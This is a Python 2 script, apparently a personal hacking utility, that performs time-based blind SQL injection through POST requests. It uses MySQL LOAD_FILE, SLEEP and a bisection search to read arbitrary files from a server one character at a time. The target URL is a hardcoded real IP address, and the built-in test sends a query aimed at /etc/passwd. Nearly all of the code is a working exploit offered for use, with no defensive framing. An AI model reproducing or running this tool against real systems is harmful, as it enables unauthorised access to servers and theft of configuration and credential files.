#!/usr/bin/python

import os
import socket
import sys
import urllib2
import urllib

from optparse import OptionParser

import log

description = """
Simple Sql injection utility prototype.
I wrote it because now sqlmap can't read files from specified offsets.
I use it when I have unstable internet connection and need
to read short chunk of data (part of config file for example) via 
time based sql injection.
Now supports only one injection method(time based blind sqli) and only inside POST requests.
Injection urls now are hardcoded.
"""

IS_DEBUG = 0

url = "http://82.146.54.187/reg.php"
data = "invite={payload}&login=ekx&password=g00d"

SLEEP_TIME = 3
MAX_TIMEVAL = 20
MAX_NERRORS = 3

default_ua = 'Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130401 Firefox/21.0'

#TODO: randomize injection stuff 
payload_q = "' OR (SELECT 5724 FROM (SELECT SLEEP(IF({CONDITION}, {sleep_time}, 0)))gozi)=5724 AND 'iNlE'='iNlE"
file_load_q = "LOAD_FILE({dst_file})"
file_load_length_q = "LENGTH({1})"
hex_q = "HEX({subq})"

safe_stuff = "IFNULL(CAST({1} as CHAR), 0x20)"
mid_expr = "ORD(MID({target},{offset},{length})){compare}"

class Status():
    SUCCESS = 0
    FAIL = 1
    ERROR = 2

class Responce():
    status = None
    buf = ""
    def __init__(self, status = Status.SUCCESS, buf = buf):
        self.status = status
        self.buf = buf
    def __str__(self):
        return "<resonce(status = %d;)>" % self.status
        
def my_replace(s, *args, **kwargs):
    i = 1
    for item in args:
        s = s.replace("{%d}" % i, item) 
        i += 1
    for key in kwargs:
        s = s.replace("{%s}" % key, kwargs[key])
    return s

#FIXME: implement GET requests
def request_http(query):
    log.debug(query)

    responce = Responce()

    try:
        #query = urllib.quote(query)

        req = urllib2.Request(url, data=query)
        req.add_header('User-Agent', default_ua)
        r = urllib2.urlopen(req, timeout=SLEEP_TIME)
        responce.buf = r.read()

    except (socket.timeout):
        log.debug("socket timeout!")

        responce.status = Status.FAIL
    except urllib2.URLError, e:
        responce.status = Status.ERROR

    return responce

def get_char(payload, first = 0x00, mid = 70, last = 0xff):
    while last - first > 0:
        log.debug("get char [%x; %x]" % (first, last))
        q = my_replace(payload, compare=">%d" % (mid))

        resp = request_http(q)

        if resp.status == Status.SUCCESS: # status success, condition is false
            last = mid
        elif resp.status == Status.FAIL: #timeout, condition is true
            first = mid + 1
        else:
            log.debug("http request error")
            continue

        mid = (last - first) / 2 + first

    return chr(mid)

def validate_char(payload, char):
    q = my_replace(payload, compare="=%d" % ord(char))
    resp = request_http(q)

    if resp.status != Status.FAIL:
        return False

    return True

#NOTE: expect this tags inside payload query:
#  compare (specifies conditional expression for blind sqli test)
#  offset (start to read file from this offset)
#  length (amount of characters, that we want to extract)
#  sleep (sleep this amount of seconds if conditional expression is True)
def bisection(payload, length, offset = 0):
    global SLEEP_TIME

    result = ""
    nerrors = 0
    while length > 0:

        log.debug("next bisection step")
        q = my_replace(payload,
                    offset="%d" % (offset + 1),
                    length="1",
                    sleep_time="%d" % SLEEP_TIME)

        ch = get_char(q)

        log.debug("restore char %s" % ch)

        if not validate_char(q, ch):
            log.debug("can't validate char")
            if nerrors > MAX_NERRORS:
                return result
            nerrors += 1
            #TODO: change timers!!!
            SLEEP_TIME += 1
            continue
        if ch == "\0":
            log.warning("null char finded, dying")
            return result

        nerrors = 0
        result += ch
        offset += 1
        length -= 1

    return result
    
def string_tonum(s):
    return "0x" + s.encode('hex')

def tests():
    assert(my_replace("this is test") == "this is test")
    assert(my_replace("{1} {2} {3}", "this", "is", "test") == "this is test")
    assert(my_replace("{first} {second} {1}", "test", first="this", second="is") == "this is test")
    query = "invite=' OR (SELECT 5724 FROM (SELECT SLEEP(IF(ORD(MID(0x2f6574632f706173737764,0,1))<70, 5, 0)))gozi)=5724 AND 'iNlE'='iNlE&login=ekx&password=g00d"
    log.debug(request_http(query))

def main():
    global default_ua

    if IS_DEBUG > 0:
        tests()
        return 0

    parser = OptionParser()
    parser.description = description
    #parser.add_option('-u', '--url', dest="url", help="target url")
    parser.add_option('-U', '--user-agent', dest="useragent", help="default user agent")
    #parser.add_option('-f', '--file', dest="file", help="file for reading")

    (options, args) = parser.parse_args()
    if options.useragent is not None:
        default_ua = options.useragent

    if len(args) < 3:
        return 1

    q = my_replace(data, payload=payload_q)
    q = my_replace(q, CONDITION=mid_expr)
    q = my_replace(q, target=file_load_q)
    q = my_replace(q, dst_file=string_tonum(args[0]))

    log.debug(q)

    r = bisection(q, int(args[2]), offset=int(args[1]))

    log.info("file %s len %s offset %s" % (args[0], args[2], args[1]))
    log.info("string = %s" % r)

if __name__ == '__main__':
    main()

